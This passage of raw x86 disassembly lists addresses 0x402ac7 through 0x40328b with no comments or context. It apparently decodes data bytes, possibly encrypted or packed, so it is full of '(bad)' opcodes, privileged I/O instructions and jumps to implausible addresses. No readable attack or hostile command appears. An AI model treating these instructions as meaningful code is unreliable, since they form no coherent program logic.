  402ac7:	mov    esp,0x621abb77
  402acc:	jbe    0x402af5
  402ace:	add    DWORD PTR [esi],esi
  402ad0:	cmp    ebx,DWORD PTR [ecx-0x10918b3d]
  402ad6:	outs   dx,DWORD PTR ds:[esi]
  402ad7:	mov    edx,0xab862e22
  402adc:	rcr    DWORD PTR [edx],0x13
  402adf:	idiv   BYTE PTR [ebx+esi*4+0x38]
  402ae3:	push   0x49eabf99
  402ae8:	sub    eax,0x2df70ffe
  402aed:	sbb    ebx,eax
  402aef:	loop   0x402a80
  402af1:	push   0x66
  402af3:	loop   0x402ab9
  402af5:	dec    ebx
  402af6:	cmp    eax,DWORD PTR [ebx-0x7b71b41b]
  402afc:	push   esp
  402afd:	pop    ebx
  402afe:	pop    es
  402aff:	sub    ebp,eax
  402b01:	sub    ecx,DWORD PTR gs:[esi+ebp*2+0x4f618085]
  402b09:	sbb    BYTE PTR [ecx-0xea30a82],dh
  402b0f:	push   cs
  402b10:	pop    edi
  402b11:	xor    esi,DWORD PTR [edx]
  402b13:	add    al,0x7f
  402b15:	xor    ebx,DWORD PTR cs:[eax+0x23]
  402b19:	xor    esi,0x65
  402b1c:	jl     0x402b9c
  402b1e:	and    al,0xbd
  402b20:	mov    esp,DWORD PTR [ecx-0x24]
  402b23:	cwde   
  402b24:	push   ss
  402b25:	mov    ds:0x45bdf241,al
  402b2a:	xchg   ebp,edi
  402b2c:	mov    bl,0xef
  402b2e:	add    eax,0x5cf929ad
  402b33:	xor    al,0xd1
  402b35:	cmp    ecx,DWORD PTR [esi]
  402b37:	sbb    DWORD PTR [ecx],0xffffffd8
  402b3a:	call   0x5d959905
  402b3f:	mov    ch,0xab
  402b41:	xchg   esi,eax
  402b42:	lock mov esi,0x3afdf664
  402b48:	jnp    0x402b18
  402b4a:	mov    fs,WORD PTR [ebx-0x40c60ed4]
  402b50:	(bad)  
  402b51:	jecxz  0x402b63
  402b53:	adc    eax,DWORD PTR [edx]
  402b55:	xlat   BYTE PTR ds:[ebx]
  402b56:	(bad)  
  402b57:	out    0x41,eax
  402b59:	retf   
  402b5a:	fistp  QWORD PTR [esi-0x39]
  402b5d:	adc    ebx,DWORD PTR [edx+ecx*2]
  402b60:	mov    ch,0xf9
  402b62:	lahf   
  402b63:	xlat   BYTE PTR ds:[ebx]
  402b64:	mov    DWORD PTR [ebx],ebx
  402b66:	mov    DWORD PTR [ebp-0x28],edx
  402b69:	adc    eax,0xa16482ff
  402b6e:	dec    eax
  402b6f:	sub    BYTE PTR [eax-0xa],al
  402b72:	xchg   ebp,eax
  402b73:	xchg   ebp,eax
  402b74:	jmp    0x485dedc9
  402b79:	icebp  
  402b7a:	xor    BYTE PTR [edx],0xdb
  402b7d:	push   ebp
  402b7e:	or     ah,al
  402b80:	or     DWORD PTR [ebp-0x57],edx
  402b83:	je     0x402bc5
  402b85:	cs pop eax
  402b87:	sbb    BYTE PTR [edx],0xf0
  402b8a:	mov    ah,0xb7
  402b8c:	inc    ecx
  402b8d:	mov    al,0x18
  402b8f:	mov    esp,0xe967c81c
  402b94:	sub    DWORD PTR [ecx+0x30],esp
  402b97:	fsubr  QWORD PTR [ebx+0x23]
  402b9a:	jae    0x402b93
  402b9c:	test   al,0x9d
  402b9e:	bound  esp,QWORD PTR [edi]
  402ba0:	xchg   esp,eax
  402ba1:	dec    ebx
  402ba2:	inc    BYTE PTR [ecx]
  402ba4:	cmc    
  402ba5:	jb     0x402c01
  402ba7:	mov    eax,0xe10902ce
  402bac:	pusha  
  402bad:	lock fldenv [eax+edi*1+0x49]
  402bb2:	sub    eax,0x1f833cf2
  402bb7:	add    esi,edi
  402bb9:	cmp    al,0x2
  402bbb:	mov    dl,0xc1
  402bbd:	out    0x85,al
  402bbf:	inc    ebx
  402bc0:	jmp    0x19d7297a
  402bc5:	and    ecx,DWORD PTR [ecx]
  402bc7:	outs   dx,DWORD PTR ds:[esi]
  402bc8:	mov    eax,0x4ece1f61
  402bcd:	data16 clc 
  402bcf:	add    eax,0x12e3f924
  402bd4:	push   ecx
  402bd5:	dec    ebp
  402bd6:	sbb    eax,0x404695ee
  402bdb:	jb     0x402c35
  402bdd:	lods   eax,DWORD PTR ds:[esi]
  402bde:	enter  0x522e,0x14
  402be2:	cmp    BYTE PTR [esi+edi*4],ch
  402be5:	pop    ebp
  402be6:	push   cs
  402be7:	xchg   ebp,eax
  402be8:	aam    0xf7
  402bea:	aam    0x64
  402bec:	adc    BYTE PTR [ebx+0x7c795708],0xca
  402bf3:	lods   eax,DWORD PTR ds:[esi]
  402bf4:	or     cl,cl
  402bf6:	ds icebp 
  402bf8:	and    al,0x4d
  402bfa:	mov    eax,0x1115b20b
  402bff:	sbb    BYTE PTR [eax],ch
  402c01:	cli    
  402c02:	mov    al,0xf
  402c04:	mov    dh,0xe
  402c06:	pusha  
  402c07:	arpl   WORD PTR [esi-0x4f],di
  402c0a:	mul    BYTE PTR [ebp-0x255b4424]
  402c10:	and    eax,0x6241573b
  402c15:	xor    eax,0x714d8e2b
  402c1a:	arpl   WORD PTR [edx-0x1fe1cad1],dx
  402c20:	dec    ebx
  402c21:	and    DWORD PTR [edx+ebp*8+0x59d35ce4],esp
  402c28:	mov    es,WORD PTR [esp+ebp*8]
  402c2b:	add    eax,0x7bb3489a
  402c30:	push   ds
  402c31:	mov    esp,0x9f83dbf8
  402c36:	and    al,0xf9
  402c38:	mov    esi,0xff1909ff
  402c3d:	ficom  WORD PTR [esi]
  402c3f:	jns    0x402bec
  402c41:	retf   0xc9b8
  402c44:	adc    bl,0xa6
  402c47:	outs   dx,BYTE PTR ds:[esi]
  402c48:	push   edx
  402c49:	or     BYTE PTR ds:0xd2a0f54,al
  402c4f:	jbe    0x402c54
  402c51:	cmp    eax,ebx
  402c53:	sub    al,0xc9
  402c55:	ins    BYTE PTR es:[edi],dx
  402c56:	mov    al,0xf0
  402c58:	aad    0xeb
  402c5a:	xchg   BYTE PTR [edx+0x59],al
  402c5d:	mov    fs,edx
  402c5f:	jle    0x402c49
  402c61:	fwait
  402c62:	cmp    DWORD PTR [ecx+0x2b],ebp
  402c65:	and    ecx,0x45
  402c68:	xor    al,0x16
  402c6a:	rcl    BYTE PTR [ebx],1
  402c6c:	pop    ss
  402c6d:	fnstenv [edi+ebx*2-0x9]
  402c71:	mov    al,ds:0xd93e676d
  402c76:	push   ebp
  402c77:	jns    0x402cdd
  402c79:	sub    eax,0x2b18bc3d
  402c7e:	xchg   edx,eax
  402c7f:	setae  BYTE PTR [edx-0x7894f978]
  402c86:	pop    ebx
  402c87:	mov    ds:0x1fe185ff,eax
  402c8c:	call   DWORD PTR [ecx+0x73]
  402c8f:	scas   al,BYTE PTR es:[edi]
  402c90:	cmp    eax,0xb3923250
  402c95:	call   0x777c:0xb0920769
  402c9c:	stos   DWORD PTR es:[edi],eax
  402c9d:	pushf  
  402c9e:	xchg   edx,eax
  402c9f:	hlt    
  402ca0:	add    bh,BYTE PTR [ebx+0x13]
  402ca3:	popa   
  402ca4:	fwait
  402ca5:	sub    BYTE PTR [edi+0x75],0xc3
  402ca9:	or     eax,0x39e6ee94
  402cae:	lea    edi,[ecx+0x22]
  402cb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cb2:	test   al,0xf7
  402cb4:	outs   dx,DWORD PTR ds:[esi]
  402cb5:	pop    ds
  402cb6:	imul   esi,DWORD PTR [edi-0x71],0xa3ed964d
  402cbd:	or     BYTE PTR ds:0x2f58de4,bh
  402cc3:	push   edx
  402cc4:	inc    eax
  402cc5:	cmp    bh,BYTE PTR [edx]
  402cc7:	push   eax
  402cc8:	daa    
  402cc9:	push   0x12
  402ccb:	shl    DWORD PTR [edi],1
  402ccd:	mov    ds:0x6a2c3217,al
  402cd2:	es adc eax,0x751a4f70
  402cd8:	pop    esi
  402cd9:	fdivr  QWORD PTR [ecx-0x402dc950]
  402cdf:	cmp    al,0xc0
  402ce1:	sti    
  402ce2:	adc    ah,BYTE PTR [ebx+ecx*8]
  402ce5:	jl     0x402c9b
  402ce7:	scas   al,BYTE PTR es:[edi]
  402ce8:	sub    dl,cl
  402cea:	repz div BYTE PTR [esi+0x2962e273]
  402cf1:	xchg   BYTE PTR [ebx],cl
  402cf3:	jae    0x402cea
  402cf5:	adc    dh,BYTE PTR [edi]
  402cf7:	ins    BYTE PTR es:[edi],dx
  402cf8:	xlat   BYTE PTR ds:[ebx]
  402cf9:	loopne 0x402d31
  402cfb:	cmp    dh,BYTE PTR [ebx-0x65b85d6c]
  402d01:	push   ebx
  402d02:	jno    0x402d3e
  402d04:	xlat   BYTE PTR ds:[ebx]
  402d05:	aam    0xef
  402d07:	push   es
  402d08:	daa    
  402d09:	jp     0x402cc0
  402d0b:	jl     0x402d1e
  402d0d:	jbe    0x402d3d
  402d0f:	cmp    esi,esp
  402d11:	ds add al,dl
  402d14:	scas   eax,DWORD PTR es:[edi]
  402d15:	cmp    edi,ebp
  402d17:	fcmovu st,st(7)
  402d19:	sub    ch,al
  402d1b:	inc    eax
  402d1c:	fcomp  st(2)
  402d1e:	dec    ebp
  402d1f:	leave  
  402d20:	pop    ebx
  402d21:	dec    edi
  402d22:	push   ebx
  402d23:	mov    al,ds:0xffa7d2dc
  402d28:	nop
  402d29:	push   ecx
  402d2a:	dec    esi
  402d2b:	cld    
  402d2c:	or     DWORD PTR [ecx+0x34],0xffffffc3
  402d30:	js     0x402d83
  402d32:	out    dx,eax
  402d33:	psrld  mm1,QWORD PTR [edx+0x7e]
  402d37:	sbb    cl,BYTE PTR [edx-0x3ca0a898]
  402d3d:	sti    
  402d3e:	push   edx
  402d3f:	repnz mov BYTE PTR [ebp-0x3de62bdd],ch
  402d46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d47:	dec    esi
  402d48:	mov    bl,0x72
  402d4a:	repnz cmp al,0x5b
  402d4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d4e:	leave  
  402d4f:	ds popa 
  402d51:	ja     0x402ce7
  402d53:	sub    eax,0xf6c56664
  402d58:	iret   
  402d59:	push   ebx
  402d5a:	adc    cl,dl
  402d5c:	dec    eax
  402d5d:	dec    eax
  402d5e:	mov    ebx,0xc98d39be
  402d63:	jne    0x402da5
  402d65:	push   esi
  402d66:	adc    ah,BYTE PTR [ecx+0x6dcf519a]
  402d6c:	(bad)  
  402d6d:	cs sub al,0xbb
  402d70:	les    eax,FWORD PTR [esi+0x77]
  402d73:	xor    BYTE PTR [eax+0x7a],dh
  402d76:	add    ch,bh
  402d78:	test   eax,0x259b1e21
  402d7d:	mov    esp,0x3ccc8ccf
  402d82:	retf   0xedc3
  402d85:	mov    ebp,0x8eb904f1
  402d8a:	cmp    al,0x7b
  402d8c:	loop   0x402d0e
  402d8e:	inc    DWORD PTR [edx]
  402d90:	fstp   TBYTE PTR [esp+ebp*1-0x17]
  402d94:	jp     0x402d88
  402d96:	dec    ecx
  402d97:	aas    
  402d98:	pop    es
  402d99:	pop    DWORD PTR [ecx-0x72]
  402d9c:	dec    edi
  402d9d:	gs pop eax
  402d9f:	(bad)  
  402da0:	shl    DWORD PTR [ebx+esi*8+0x303e5c9c],0x2
  402da8:	xchg   edi,eax
  402da9:	ins    DWORD PTR es:[edi],dx
  402daa:	out    dx,eax
  402dab:	mov    WORD PTR [ebp-0x8],gs
  402dae:	push   cs
  402daf:	test   DWORD PTR [edi-0x14],ebx
  402db2:	inc    esp
  402db3:	loop   0x402e14
  402db5:	ret    
  402db6:	fwait
  402db7:	bound  eax,QWORD PTR [edi+0x22]
  402dba:	jl     0x402de9
  402dbc:	arpl   WORD PTR [ecx],bx
  402dbe:	mov    edi,0xaa1d9669
  402dc4:	mov    ch,0x58
  402dc6:	or     al,0x2c
  402dc8:	(bad)  
  402dc9:	jge    0x402e1c
  402dcb:	pop    ebx
  402dcc:	(bad)
  402dd0:	xor    DWORD PTR [edi],esi
  402dd2:	dec    ebp
  402dd3:	ds jne 0x402dd2
  402dd6:	mov    edx,0xa29ce93a
  402ddb:	dec    ebp
  402ddc:	fiadd  WORD PTR [ebx+eax*1]
  402ddf:	pop    ds
  402de0:	mov    ch,0xe0
  402de2:	in     eax,0xc4
  402de4:	sbb    bl,0xaa
  402de7:	shl    DWORD PTR [edi+0x42d83774],cl
  402ded:	pushf  
  402dee:	sbb    eax,DWORD PTR [ebx+0x27]
  402df1:	das    
  402df2:	dec    BYTE PTR [edx+0x2d]
  402df5:	jmp    0xdc73:0x7088a631
  402dfc:	aam    0x25
  402dfe:	xchg   edx,eax
  402dff:	or     dh,BYTE PTR [edi-0x562b6130]
  402e05:	scas   al,BYTE PTR es:[di]
  402e07:	imul   ebp,DWORD PTR [ecx+0x3a543c65],0xa92f8c91
  402e11:	sbb    al,0x4b
  402e13:	pop    DWORD PTR [ebx+0x3c6209cc]
  402e19:	mov    eax,ds:0xe6aa1224
  402e1e:	pop    es
  402e1f:	mov    esp,0x474d1990
  402e24:	(bad)  
  402e26:	cmp    dl,BYTE PTR [ecx+0x1720beb6]
  402e2c:	push   esi
  402e2d:	sub    bl,BYTE PTR [ecx+0xe]
  402e30:	dec    edx
  402e31:	in     al,0x87
  402e33:	cs std 
  402e35:	in     eax,0x81
  402e37:	sbb    edi,DWORD PTR [edx]
  402e39:	test   DWORD PTR [edx-0x33dd080c],edx
  402e3f:	mov    WORD PTR [edx-0x1ff3b034],fs
  402e45:	dec    esi
  402e46:	out    dx,al
  402e47:	pop    ebp
  402e48:	dec    edi
  402e49:	leave  
  402e4a:	mov    edx,0x12359abb
  402e4f:	test   DWORD PTR [ecx-0x5a79c00b],esi
  402e55:	dec    ebp
  402e56:	or     eax,DWORD PTR [edi]
  402e58:	mov    ah,0x1e
  402e5a:	les    ebx,FWORD PTR [ebx]
  402e5c:	arpl   WORD PTR [edi],dx
  402e5e:	nop
  402e5f:	scas   eax,DWORD PTR es:[edi]
  402e60:	ficom  WORD PTR [edi-0x368a4d6b]
  402e66:	or     al,0xa1
  402e68:	ds mov ah,0xf1
  402e6b:	xor    al,0x27
  402e6d:	xor    al,0x4a
  402e6f:	lods   al,BYTE PTR ds:[esi]
  402e70:	hlt    
  402e71:	lahf   
  402e72:	mov    ah,0xd
  402e74:	push   ds
  402e75:	adc    DWORD PTR gs:[ebx-0x1e649688],ecx
  402e7c:	mov    al,ds:0x4934f347
  402e81:	ret    
  402e82:	push   ecx
  402e83:	mov    edx,0x549dcece
  402e88:	sbb    BYTE PTR [ecx],bl
  402e8a:	xchg   esi,eax
  402e8b:	push   edx
  402e8c:	dec    ebx
  402e8d:	and    eax,DWORD PTR [ecx+ecx*2+0x75ffc48a]
  402e94:	lea    ecx,[ebp-0x77]
  402e97:	stc    
  402e98:	xchg   ebp,eax
  402e99:	cmp    esi,DWORD PTR [eax+0x5029903e]
  402e9f:	iret   
  402ea0:	jno    0x402ef8
  402ea2:	mov    esp,0xf5f31c98
  402ea7:	popf   
  402ea8:	in     al,0xcf
  402eaa:	push   0xe
  402eac:	add    al,0x6a
  402eae:	mov    eax,0x6b35736e
  402eb3:	lock aad 0x50
  402eb6:	shl    ch,1
  402eb8:	pop    ecx
  402eb9:	cmp    DWORD PTR [edi],edi
  402ebb:	lahf   
  402ebc:	mov    bh,0xfc
  402ebe:	jae    0x402ec7
  402ec0:	or     cl,bl
  402ec2:	add    eax,0x63dd868a
  402ec7:	pop    es
  402ec8:	retf   0x173d
  402ecb:	mov    edi,0x1f70828e
  402ed0:	call   0xdf649d91
  402ed5:	mov    bh,0x4a
  402ed7:	cmp    eax,0x33e71651
  402edc:	push   edi
  402edd:	(bad)  
  402ede:	jp     0x402ef7
  402ee0:	mov    al,0xce
  402ee2:	add    BYTE PTR [ecx+0x54307028],dh
  402ee8:	test   ebx,ebp
  402eea:	add    al,0x82
  402eec:	sbb    BYTE PTR fs:[ebp+0x66],bh
  402ef0:	mov    ecx,0xcb7da749
  402ef5:	(bad)  
  402ef6:	lods   al,BYTE PTR ds:[esi]
  402ef7:	xchg   edi,eax
  402ef8:	pop    ebx
  402ef9:	in     al,dx
  402efa:	js     0x402eb4
  402efc:	push   es
  402efd:	call   0xb4ef:0x98c0007e
  402f04:	and    eax,0x582f0bed
  402f09:	sbb    bl,dl
  402f0b:	std    
  402f0c:	mov    eax,ds:0x28eacea5
  402f11:	push   ds
  402f12:	sub    BYTE PTR [ebp+0x2fd3766f],bh
  402f18:	js     0x402f1e
  402f1a:	cmp    edi,DWORD PTR [edx-0x6f5add35]
  402f20:	sbb    al,0x89
  402f22:	cwde   
  402f23:	xchg   ecx,eax
  402f24:	das    
  402f25:	sbb    bh,dl
  402f27:	scas   eax,DWORD PTR es:[edi]
  402f28:	cld    
  402f29:	cmp    eax,0xf18b461c
  402f2e:	add    ah,BYTE PTR [ebp+0x4ef0d45a]
  402f34:	xchg   esi,eax
  402f35:	in     eax,0xb
  402f37:	je     0x402f57
  402f39:	jl     0x402f2e
  402f3b:	xchg   esi,eax
  402f3c:	inc    edx
  402f3d:	leave  
  402f3e:	mov    esi,0x6841102b
  402f43:	int3   
  402f44:	add    cl,BYTE PTR [edx+0x16]
  402f47:	ja     0x402f4f
  402f49:	cli    
  402f4a:	enter  0xb061,0x51
  402f4e:	push   0x45a7d179
  402f53:	cwde   
  402f54:	xor    bh,BYTE PTR [ecx]
  402f56:	mov    DWORD PTR [edx+0x1c],esi
  402f59:	push   ebp
  402f5a:	push   ds
  402f5b:	and    ecx,eax
  402f5d:	jb     0x402f4c
  402f5f:	sub    DWORD PTR [esi+0x6be700fc],ecx
  402f65:	xchg   DWORD PTR [edi+0x0],ebp
  402f68:	jmp    0x402fdb
  402f6a:	shl    BYTE PTR [edx-0x5e],0x0
  402f6e:	mul    BYTE PTR [edi-0x33212ab2]
  402f74:	shl    BYTE PTR [ecx+0x9b89a88],cl
  402f7a:	adc    eax,0x881ca647
  402f7f:	fidivr WORD PTR [eax+0x68]
  402f82:	add    eax,0xc3d982d6
  402f87:	xchg   esp,eax
  402f88:	js     0x402f4c
  402f8a:	outs   dx,BYTE PTR ds:[esi]
  402f8b:	shl    DWORD PTR [eiz*1-0x53cf177d],1
  402f92:	push   0xc4511552
  402f97:	(bad)  
  402f98:	cmp    BYTE PTR [eax+0x664bf05f],dl
  402f9e:	stos   BYTE PTR es:[edi],al
  402f9f:	mov    eax,0xc16171d4
  402fa4:	cmc    
  402fa5:	inc    esi
  402fa6:	mov    esp,0x51e97074
  402fab:	jne    0x40301d
  402fad:	inc    edx
  402fae:	inc    esp
  402faf:	inc    edx
  402fb0:	sbb    DWORD PTR [ecx+0x12],esi
  402fb3:	leave  
  402fb4:	sub    ch,ch
  402fb6:	pop    edi
  402fb7:	and    BYTE PTR [eax],ah
  402fb9:	int    0xcc
  402fbb:	mov    bl,0x5e
  402fbd:	sub    eax,0x79ec3e07
  402fc2:	imul   ebp,DWORD PTR [esi+0x1f94391d],0x64
  402fc9:	cld    
  402fca:	mov    al,0x55
  402fcc:	pop    ebx
  402fcd:	ds loop 0x402f9a
  402fd0:	es loope 0x403041
  402fd3:	in     al,dx
  402fd4:	inc    ecx
  402fd5:	rcl    DWORD PTR [ebp+ecx*1-0x2cf1d1e],cl
  402fdc:	leave  
  402fdd:	xchg   al,dh
  402fdf:	out    dx,al
  402fe0:	mov    bl,0x27
  402fe2:	out    dx,eax
  402fe3:	push   ecx
  402fe4:	xchg   ebp,eax
  402fe5:	ret    0xaa4f
  402fe8:	cmp    al,0xc1
  402fea:	pop    edi
  402feb:	add    ecx,DWORD PTR [esi]
  402fed:	adc    edi,ebx
  402fef:	ja     0x402ffe
  402ff1:	fdivr  st,st(2)
  402ff3:	pop    edx
  402ff4:	loope  0x403030
  402ff6:	pop    es
  402ff7:	push   eax
  402ff8:	aas    
  402ff9:	inc    ebx
  402ffa:	rcr    cl,1
  402ffc:	inc    edi
  402ffd:	mov    ecx,0x2427bd4d
  403002:	pop    es
  403003:	daa    
  403004:	pop    ebx
  403005:	mov    al,0x65
  403007:	and    edi,ebx
  403009:	stos   BYTE PTR es:[edi],al
  40300a:	mov    ds:0x9ed364de,al
  40300f:	xor    ah,BYTE PTR [eax+0x51]
  403012:	sbb    eax,0x9671c9cb
  403017:	xchg   edx,eax
  403018:	sbb    dl,dl
  40301a:	sub    BYTE PTR [esi+0x6eb43f8e],bh
  403020:	shr    BYTE PTR [edi],cl
  403022:	jle    0x402fca
  403024:	xor    dh,dh
  403026:	push   eax
  403027:	sub    esi,esp
  403029:	inc    esp
  40302a:	jecxz  0x403000
  40302c:	dec    ecx
  40302d:	mov    esp,0x2fdf4c78
  403032:	jmp    0x402fc5
  403034:	xchg   edx,eax
  403035:	cdq    
  403036:	or     esi,DWORD PTR [edx+0x3b1afb89]
  40303c:	sbb    al,BYTE PTR [eax-0x3d9bca19]
  403042:	(bad)  
  403043:	jne    0x403076
  403045:	js     0x40305e
  403047:	retf   
  403048:	mov    bl,0x1
  40304a:	sbb    esp,DWORD PTR [edi-0x3472108b]
  403050:	aad    0xcc
  403052:	jp     0x403096
  403054:	bound  eax,QWORD PTR ds:0xff81adf6
  40305a:	mov    DWORD PTR [ebp+0x0],esp
  40305d:	jnp    0x403073
  40305f:	and    edx,eax
  403061:	xchg   esi,eax
  403062:	xchg   ebx,eax
  403063:	xchg   ecx,eax
  403064:	cmc    
  403065:	push   ss
  403066:	arpl   cx,ax
  403068:	dec    esi
  403069:	test   eax,0xc47bced
  40306e:	add    al,0xa9
  403070:	scas   al,BYTE PTR es:[edi]
  403071:	outs   dx,DWORD PTR ds:[esi]
  403072:	pop    ebp
  403073:	fld    TBYTE PTR [edx+0x32]
  403076:	dec    edi
  403077:	test   BYTE PTR [ebx],ah
  403079:	xor    DWORD PTR [eax+0x6977092f],ecx
  40307f:	pop    DWORD PTR fs:[ecx+0x38f22855]
  403086:	je     0x403087
  403088:	adc    edx,DWORD PTR [eax-0x18]
  40308b:	fwait
  40308c:	xchg   ebx,eax
  40308d:	mov    ebx,0x9179a680
  403092:	mov    BYTE PTR [ecx+0x7da250fe],bh
  403098:	sbb    eax,0x47d2f5b2
  40309d:	push   0xffffff9c
  40309f:	in     al,dx
  4030a0:	dec    ecx
  4030a1:	adc    dl,ch
  4030a3:	adc    al,0x6e
  4030a5:	sub    esi,eax
  4030a7:	jnp    0x403052
  4030a9:	gs cmp eax,0x9024e4be
  4030af:	sahf   
  4030b0:	xor    DWORD PTR [ebx],0x46
  4030b3:	adc    ch,BYTE PTR [eax+edx*8+0x66]
  4030b7:	fild   WORD PTR [edx+0x2cda733b]
  4030bd:	jb     0x403069
  4030bf:	retf   
  4030c0:	jp     0x403098
  4030c2:	inc    esp
  4030c3:	nop
  4030c4:	clc    
  4030c5:	lea    ecx,[ebx-0x9abda16]
  4030cb:	add    eax,0xf1d5b669
  4030d0:	and    DWORD PTR [esi+0x6c3513c],ebx
  4030d6:	dec    eax
  4030d7:	inc    ebp
  4030d8:	jb     0x40311f
  4030da:	bound  esp,QWORD PTR [esi]
  4030dc:	push   ss
  4030dd:	lahf   
  4030de:	mov    dl,0x98
  4030e0:	jl     0x40307c
  4030e2:	enter  0xcff8,0xa6
  4030e6:	add    DWORD PTR [eiz*1-0x3e2f888b],edi
  4030ed:	jb     0x403166
  4030ef:	lods   eax,DWORD PTR ds:[esi]
  4030f0:	outs   dx,BYTE PTR ds:[esi]
  4030f1:	rcr    edx,1
  4030f3:	sub    BYTE PTR [edx-0x68],cl
  4030f6:	jp     0x40312d
  4030f8:	sub    DWORD PTR [eax],ebp
  4030fa:	loope  0x4030bd
  4030fc:	cmp    eax,0x8e0283ca
  403101:	mov    eax,0x9048dc49
  403106:	mov    esi,0xac323762
  40310b:	scas   al,BYTE PTR es:[edi]
  40310c:	and    al,0x1d
  40310e:	push   ebx
  40310f:	or     al,0x3b
  403111:	fisubr DWORD PTR [ebx+0x6a]
  403114:	dec    edx
  403115:	cwde   
  403116:	jmp    0x403162
  403118:	mov    eax,ds:0xe0017ba3
  40311d:	mov    ah,0xc6
  40311f:	xor    eax,0xe49ddb4
  403124:	in     eax,0x6e
  403126:	stos   BYTE PTR es:[edi],al
  403127:	outs   dx,BYTE PTR ds:[esi]
  403128:	jge    0x40319b
  40312a:	into   
  40312b:	mov    cl,0xa8
  40312d:	mov    bl,0x36
  40312f:	loop   0x403196
  403131:	(bad)  
  403134:	hlt    
  403135:	out    0xf,eax
  403137:	ret    
  403138:	mov    esi,0x6e4291c7
  40313d:	popa   
  40313e:	inc    edx
  40313f:	xlat   BYTE PTR ds:[ebx]
  403140:	and    al,0xea
  403142:	push   ebx
  403143:	loopne 0x403196
  403145:	fsub   st(1),st
  403147:	lahf   
  403148:	loope  0x4031bc
  40314a:	nop
  40314b:	inc    ebp
  40314c:	sub    bl,BYTE PTR [edx+eax*8]
  40314f:	aad    0x14
  403151:	pop    ebx
  403152:	fnstsw WORD PTR [esi+esi*2]
  403155:	mov    al,ds:0xeb1b3714
  40315a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40315b:	aam    0x4a
  40315d:	loopne 0x403112
  40315f:	aas    
  403160:	cmc    
  403161:	mov    ds:0x6b0faa8b,al
  403166:	pushf  
  403167:	daa    
  403168:	cmp    esi,DWORD PTR [ebp+edi*8-0x35]
  40316c:	mov    BYTE PTR [esp+ebp*4-0x722d51b8],al
  403173:	xor    DWORD PTR [edx+0x5eda3f52],ebx
  403179:	popf   
  40317a:	mov    ah,0xc8
  40317c:	dec    edi
  40317d:	xchg   BYTE PTR [edx+0x24e3e8bb],al
  403183:	sub    dh,0x43
  403186:	in     eax,dx
  403187:	jmp    0x1ca5:0x627456be
  40318e:	mov    ecx,0x544bb372
  403193:	sbb    DWORD PTR [eax],ecx
  403195:	pusha  
  403196:	clc    
  403197:	fst    QWORD PTR [ebx+0x7e586180]
  40319d:	(bad)  
  40319e:	add    DWORD PTR [ecx],0xccd6fe01
  4031a4:	sahf   
  4031a5:	dec    edx
  4031a6:	sub    DWORD PTR [eax],ecx
  4031a8:	dec    ebp
  4031a9:	rol    bh,cl
  4031ab:	pop    ebp
  4031ac:	cmp    al,dh
  4031ae:	cmp    ch,ah
  4031b0:	xchg   ebx,eax
  4031b1:	ret    
  4031b2:	movhlps xmm7,xmm4
  4031b5:	push   ecx
  4031b6:	stc    
  4031b7:	dec    edi
  4031b8:	xchg   ebp,eax
  4031b9:	outs   dx,BYTE PTR ds:[esi]
  4031ba:	pop    ds
  4031bb:	mov    esp,0x13c67327
  4031c0:	adc    al,0x75
  4031c2:	dec    esi
  4031c3:	std    
  4031c4:	dec    esp
  4031c5:	aaa    
  4031c6:	inc    eax
  4031c7:	dec    esi
  4031c8:	loopne 0x403243
  4031ca:	xor    eax,0xf3c0ecd0
  4031cf:	inc    ebp
  4031d0:	mov    WORD PTR [edx],es
  4031d2:	ja     0x4031a3
  4031d4:	repnz pop ecx
  4031d6:	pop    edi
  4031d7:	inc    ecx
  4031d8:	rol    DWORD PTR [ebp+0x8],cl
  4031db:	pushf  
  4031dc:	pop    esp
  4031dd:	dec    eax
  4031de:	and    ah,BYTE PTR [ebx+ecx*4+0x50b03b27]
  4031e5:	stc    
  4031e6:	pusha  
  4031e7:	test   al,0x56
  4031e9:	add    esi,ecx
  4031eb:	ret    0xefd2
  4031ee:	sahf   
  4031ef:	lds    esp,FWORD PTR [ecx]
  4031f1:	sbb    al,0xa8
  4031f3:	pop    es
  4031f4:	inc    eax
  4031f5:	push   es
  4031f6:	xchg   ebp,eax
  4031f7:	adc    al,BYTE PTR ds:0x582f7e07
  4031fd:	inc    eax
  4031fe:	sahf   
  4031ff:	frstor [edx]
  403201:	shr    BYTE PTR [edi+0x4a],cl
  403204:	jmp    0x276f:0xfb52522e
  40320b:	xchg   ebx,eax
  40320c:	xlat   BYTE PTR ds:[ebx]
  40320d:	fld    TBYTE PTR [eax-0x3c4ad19b]
  403213:	jno    0x40326c
  403215:	xor    bh,BYTE PTR [esp-0x9]
  403219:	outs   dx,DWORD PTR ds:[esi]
  40321a:	mov    al,ds:0x94e13f2f
  40321f:	sar    DWORD PTR [edi+0x5c],1
  403222:	outs   dx,DWORD PTR ds:[esi]
  403223:	aad    0x72
  403225:	jge    0x4031ef
  403227:	out    0x4f,eax
  403229:	out    0xb8,al
  40322b:	popa   
  40322c:	sti    
  40322d:	fldenv [edx-0x15]
  403230:	jo     0x403246
  403232:	mov    ecx,0xcec92571
  403237:	leave  
  403238:	stos   DWORD PTR es:[edi],eax
  403239:	ja     0x403269
  40323b:	lock es mov esi,0xaeea8622
  403242:	xchg   DWORD PTR [ebx+0x4f],edx
  403245:	daa    
  403246:	push   esp
  403247:	mov    cl,0xe4
  403249:	sub    BYTE PTR [ecx],bh
  40324b:	aad    0x35
  40324d:	jo     0x403244
  40324f:	hlt    
  403250:	outs   dx,BYTE PTR ds:[esi]
  403251:	inc    edi
  403252:	cmp    BYTE PTR ds:0x7f1e1c83,cl
  403258:	and    eax,0xcb3c4beb
  40325d:	push   0xffffffca
  40325f:	ins    BYTE PTR es:[edi],dx
  403260:	popf   
  403261:	cmp    eax,0x836edacc
  403266:	fistp  DWORD PTR [edx]
  403268:	sti    
  403269:	pop    ecx
  40326a:	out    dx,eax
  40326b:	xor    dh,ah
  40326d:	mov    ch,0x68
  40326f:	lods   al,BYTE PTR ds:[esi]
  403270:	inc    ebp
  403271:	ja     0x403235
  403273:	add    al,0xbc
  403275:	out    0xcd,eax
  403277:	mov    WORD PTR [edi-0x29],es
  40327a:	aad    0x54
  40327c:	push   esp
  40327d:	mov    esi,0x1096759f
  403282:	xchg   esp,eax
  403283:	ss push 0x72
  403286:	jg     0x4032f2
  403288:	sub    ecx,ebp
  40328a:	in     al,dx
  40328b:	jo     0x4032fb
